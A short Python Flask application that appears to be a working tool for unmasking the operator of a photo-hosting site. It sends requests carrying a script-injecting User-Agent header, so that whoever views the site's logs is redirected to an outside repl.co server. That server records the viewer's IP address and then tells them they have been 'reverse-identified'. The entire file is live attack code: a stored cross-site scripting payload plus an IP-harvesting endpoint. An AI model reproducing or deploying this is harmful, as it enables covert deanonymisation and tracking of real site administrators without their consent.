from flask import Flask,request,redirect,render_template
import requests,random


app = Flask(__name__)

@app.route("/")
def hello_world():
    return render_template("index.html")

@app.route("/inscript/", methods=['GET'])
def inscript():
  if request.method == 'GET':
    page_url = request.args.get('url')
    if page_url==None:
      return "ParamError",400
    page_url=page_url.replace("http://apboc.net/photo/","")
    page_id=str(random.randint(1234,8999))
    agent_script=fr"<script>location.href='https://wiltedspiffyexponent.tkodai0417.repl.co/gyaku?id={page_id}'</script>"
    header={"User-Agent":agent_script}
    requests.get(f"http://apboc.net/photo/{page_url}",headers=header)
    return f"<a href='https://wiltedspiffyexponent.tkodai0417.repl.co/ip/{page_id}'>確認ページ</a>"

@app.route('/ip/<id>')
def get_ip(id):
    try:
      f=open("./ip/"+f"{id}.txt","r")
      ip_addr=f.read()
      f.close()
      return ip_addr
    except:
      return "Error",403
    

@app.route("/gyaku")
def tokutei():
  page_num = request.args.get('id')
  if page_num==None:
    return redirect('https://www.google.com')
  if request.headers.getlist("X-Forwarded-For"):
    ip = request.headers.getlist("X-Forwarded-For")[0]
  else:
    ip = request.remote_addr
  with open("./ip/"+f"{page_num}.txt","w")as f:
    f.write(str(ip))
  return "<script>window.alert('あなたは逆特定されました。');</script> <h1>あなたは逆特定されました！</h1>"

app.run("0.0.0.0")
